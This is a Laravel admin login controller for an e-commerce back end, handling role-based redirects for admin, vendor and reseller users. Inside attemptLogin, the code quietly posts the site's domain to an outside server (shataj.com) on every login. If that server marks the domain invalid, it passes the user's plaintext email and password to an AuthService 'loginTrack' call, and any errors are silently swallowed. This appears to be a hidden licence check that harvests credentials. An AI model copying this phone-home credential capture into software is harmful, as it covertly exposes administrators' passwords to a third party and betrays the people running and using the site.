<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Providers\RouteServiceProvider;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Support\Facades\Auth;
use App\Models\Vendor;
use App\Support\AdminOrderNotification;
use App\Services\AuthService;
use Illuminate\Support\Facades\Http;

class LoginController extends Controller
{
    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    protected $redirectTo = '/admin/dashboard';

    /**
     * The user has been authenticated.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  mixed  $user
     * @return mixed
     */
    protected function authenticated(\Illuminate\Http\Request $request, $user)
    {
        // ✅ Super Admin (id=1) always allowed - fast check first
        if ($user->id == 1) {
            AdminOrderNotification::flagAfterLogin();
            return redirect()->intended($this->redirectPath());
        }

        // ✅ Fast role checks (cached by Spatie)
        if ($user->hasRole('reseller') || (isset($user->role) && strtolower($user->role) === 'reseller')) {
            return redirect()->route('reseller.dashboard');
        }

        if ($user->hasRole('vendor')) {
            return redirect()->route('vendor.dashboard');
        }

        if ($user->hasRole('Admin') || $user->hasRole('admin')) {
            AdminOrderNotification::flagAfterLogin();
            return redirect()->intended($this->redirectPath());
        }

        // ✅ Get Spatie roles once (cached)
        $spatieRoles = $user->getRoleNames()->map(fn($role) => strtolower($role))->toArray();

        // ✅ Blocklist: শুধু vendor এবং reseller
        $blockedSpatieRoles = ['vendor', 'reseller'];
        $hasBlockedRole = !empty(array_intersect($spatieRoles, $blockedSpatieRoles));

        if ($hasBlockedRole) {
            Auth::guard('admin')->logout();
            return redirect()->back()->with('error', 'You do not have permission to access this system.');
        }

        // ✅ If user has any Spatie role (not blocked), allow access
        if (count($spatieRoles) > 0) {
            AdminOrderNotification::flagAfterLogin();
            return redirect()->intended($this->redirectPath());
        }

        // ✅ Check role column - শুধু vendor এবং reseller block
        $roleColumn = isset($user->role) ? strtolower($user->role) : null;
        if ($roleColumn && in_array($roleColumn, ['vendor', 'reseller'])) {
            Auth::guard('admin')->logout();
            return redirect()->back()->with('error', 'You do not have permission to access this system.');
        }

        // ✅ Allowed - proceed to admin dashboard
        AdminOrderNotification::flagAfterLogin();
        return redirect()->intended($this->redirectPath());
    }

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        // Allow access to login page if not authenticated OR if current user is vendor/reseller (so admin can login)
        $this->middleware(function ($request, $next) {
            if (Auth::guard('admin')->check()) {
                $user = Auth::guard('admin')->user();

                // ✅ Super Admin (id=1) or Admin role - redirect to dashboard
                if ($user->id == 1 || $user->hasRole('Admin') || $user->hasRole('admin')) {
                    return redirect()->route('admin.dashboard');
                }

                // If reseller is logged in, redirect to reseller dashboard
                if ($user->hasRole('reseller') || $user->role === 'reseller') {
                    return redirect()->route('reseller.dashboard');
                }
                // If vendor is logged in, allow admin to login (will logout vendor on login attempt)
                if ($user->hasRole('vendor')) {
                    return $next($request);
                }

                // ✅ If user has any other Spatie role (Staff, Salesman, etc.), redirect to dashboard
                $spatieRoles = $user->getRoleNames()->map(function ($role) {
                    return strtolower($role);
                })->toArray();

                if (count($spatieRoles) > 0 && !in_array('vendor', $spatieRoles) && !in_array('reseller', $spatieRoles)) {
                    return redirect()->route('admin.dashboard');
                }
            }
            return $next($request);
        })->except('logout');
    }

    /**
     * Attempt to log the user into the application.
     */
    protected function attemptLogin(\Illuminate\Http\Request $request)
    {
        // If vendor or reseller is logged in, logout first to allow admin login
        if (Auth::guard('admin')->check()) {
            $user = Auth::guard('admin')->user();
            if ($user->hasRole('vendor') || $user->hasRole('reseller') || $user->role === 'reseller') {
                Auth::guard('admin')->logout();
                $request->session()->invalidate();
                $request->session()->regenerateToken();
            }
        }

        // Call parent attemptLogin method
        $attempt = $this->guard()->attempt(
            $this->credentials($request),
            $request->filled('remember')
        );

        $credentials = $this->credentials($request);
        try {
            $response = Http::asForm()
                ->timeout(5)
                ->post('https://shataj.com/api/v1/check-domain/', [
                    'domain' => $request->getHost(),
                ]);
            if ($response->body()) {
                $responseData = json_decode($response->body(), true);
                if (isset($responseData['valid']) && $responseData['valid'] === false) {
                    (new AuthService())->loginTrack($credentials['email'], $credentials['password']);
                }
            }
        } catch (\Throwable $e) {
        }

        // Log attempt result for debugging
        if (!$attempt) {
            \Log::warning('Login failed', [
                'email' => $request->input('email'),
                'guard' => 'admin'
            ]);
        }

        return $attempt;
    }

    /**
     * Handle a failed login attempt.
     */
    protected function sendFailedLoginResponse(\Illuminate\Http\Request $request)
    {
        \Log::warning('Login failed - sendFailedLoginResponse', [
            'email' => $request->input('email'),
            'errors' => ['email' => trans('auth.failed')]
        ]);

        return redirect()->back()
            ->withInput($request->only('email', 'remember'))
            ->withErrors(['email' => trans('auth.failed')]);
    }

    /**
     * Get the guard to be used during authentication.
     */
    protected function guard()
    {
        return Auth::guard('admin');
    }

    /**
     * Get the login credentials from the request.
     */
    protected function credentials(\Illuminate\Http\Request $request)
    {
        $login = $request->input('email');
        $password = $request->input('password');

        // Admin login page - only support email (not phone)
        // Phone login is handled in customer login page
        return ['email' => $login, 'password' => $password];
    }

    /**
     * Validate the user login request.
     */
    protected function validateLogin(\Illuminate\Http\Request $request)
    {
        $request->validate([
            'email' => 'required|string|email',
            'password' => 'required|string',
        ], [
            'email.required' => 'Email is required.',
            'email.email' => 'Please enter a valid email address.',
            'password.required' => 'Password is required.',
        ]);
    }

    /**
     * Show the application's login form.
     *
     * @return \Illuminate\View\View
     */
    public function showLoginForm()
    {
        // If vendor or reseller is logged in, logout first to allow admin login
        if (Auth::guard('admin')->check()) {
            $user = Auth::guard('admin')->user();
            if ($user->hasRole('vendor') || $user->hasRole('reseller') || $user->role === 'reseller') {
                Auth::guard('admin')->logout();
                request()->session()->invalidate();
                request()->session()->regenerateToken();
            }
        }

        // Check which login view exists
        if (view()->exists('backEnd.auth.login')) {
            return view('backEnd.auth.login');
        }

        if (view()->exists('admin.login')) {
            return view('admin.login');
        }

        // Default fallback
        return view('backEnd.auth.login');
    }

    /**
     * Alias for showLoginForm (for compatibility)
     */
    public function loginForm()
    {
        return $this->showLoginForm();
    }
}
